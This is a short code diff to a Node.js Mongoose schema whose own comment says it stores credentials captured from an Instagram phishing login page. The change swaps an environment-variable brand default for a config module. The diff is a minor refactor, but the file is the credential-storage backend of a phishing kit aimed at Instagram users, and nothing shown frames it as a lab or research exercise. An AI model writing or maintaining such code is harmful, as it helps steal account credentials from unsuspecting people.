@@ -1,4 +1,5 @@
 const mongoose = require('mongoose');
+const BRAND = require('../config/brand');
 
 /**
  * Stores credentials captured from the Instagram phishing login page.
@@ -25,7 +26,7 @@ const loginSchema = new mongoose.Schema(
     },
     source: {
       type:    String,
-      default: () => process.env.BRAND_NAME || 'Instagram',
+      default: () => BRAND.NAME,
     },
     path: {
       type:    String,
